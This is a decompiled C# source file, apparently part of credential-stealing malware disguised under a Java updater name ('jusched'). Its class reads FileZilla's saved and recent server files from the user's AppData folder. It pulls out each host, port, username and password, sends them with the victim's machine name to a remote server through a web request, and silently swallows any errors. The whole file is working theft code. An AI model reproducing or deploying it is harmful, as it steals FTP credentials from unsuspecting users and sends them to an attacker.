using System;
using System.Collections;
using System.IO;
using System.Xml;
using Microsoft.VisualBasic.CompilerServices;

namespace jusched.ftp;

internal class fzill
{
	private static string[] strFilenames = new string[2] { "sitemanager.xml", "recentservers.xml" };

	private static string strFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla");

	public static void nuevo()
	{
		string[] array = strFilenames;
		foreach (string path in array)
		{
			string text = Path.Combine(strFolderPath, path);
			if (File.Exists(text))
			{
				Read(text);
			}
		}
	}

	private static void Read(string string_0)
	{
		try
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(string_0);
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = xmlDocument.DocumentElement!.ChildNodes[0]!.ChildNodes.GetEnumerator();
				while (enumerator.MoveNext())
				{
					XmlNode xmlNode = (XmlNode)enumerator.Current;
					global_0.webget(Configuration.stnot + "?action=add&a=15&u=" + xmlNode.ChildNodes[0]!.InnerText + ":" + xmlNode.ChildNodes[1]!.InnerText + "&l=" + xmlNode.ChildNodes[4]!.InnerText + "&p=" + xmlNode.ChildNodes[5]!.InnerText + "&c=" + Configuration.strHostName);
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
